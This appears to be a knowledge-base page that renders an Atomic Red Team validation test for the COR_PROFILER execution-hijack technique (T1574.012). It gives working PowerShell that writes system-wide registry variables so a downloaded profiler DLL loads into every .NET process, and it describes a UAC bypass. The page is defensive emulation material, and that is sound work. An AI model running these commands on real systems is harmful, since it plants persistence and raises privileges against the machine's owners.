---
atomic_guid: "f373b482-48c8-4ce4-85ed-d40c8b3f7310"
title: "System Scope COR_PROFILER"
framework: "atomic"
generated: "true"
attack_technique_id: "T1574.012"
attack_technique_name: "Hijack Execution Flow: COR_PROFILER"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "f373b482-48c8-4ce4-85ed-d40c8b3f7310"
  - "System Scope COR_PROFILER"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# System Scope COR_PROFILER

Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.
The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

## Metadata

- Atomic GUID: f373b482-48c8-4ce4-85ed-d40c8b3f7310
- Technique: T1574.012: Hijack Execution Flow: COR_PROFILER
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1574.012/T1574.012.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1574-hijack_execution_flow|T1574.012]]

## Input Arguments

### clsid_guid

- description: custom clsid guid
- type: string
- default: {09108e71-974c-4010-89cb-acf471ae9e2c}

### file_name

- description: unmanaged profiler DLL
- type: path
- default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll

## Dependencies

"#{file_name}" must be present

### Prerequisite Check

```text
if (Test-Path "#{file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
```

### Cleanup

```powershell
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.yaml)
